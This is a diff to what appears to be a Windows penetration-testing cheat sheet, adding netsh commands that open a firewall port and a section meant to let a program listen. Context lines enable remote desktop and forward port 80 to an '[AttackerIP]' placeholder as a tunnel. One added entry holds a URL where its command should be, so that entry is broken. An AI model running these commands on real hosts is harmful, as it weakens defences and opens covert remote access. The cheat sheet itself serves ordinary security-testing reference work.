@@ -18,6 +18,16 @@ When you modify a system to talk on the network, you may need to alter the Windo
 
 `netsh firewall set service type = remotedesktop mode = enable`
 
+### Allow a program to listen through the firewall
+Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
+
+`http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html`
+
+### Open a port on the firewall
+Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
+
+`netsh firewall add portopening tcp 2482 lt enable all`
+
 
 ### Tunnel Traffic Natively with Windows
 `netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80`
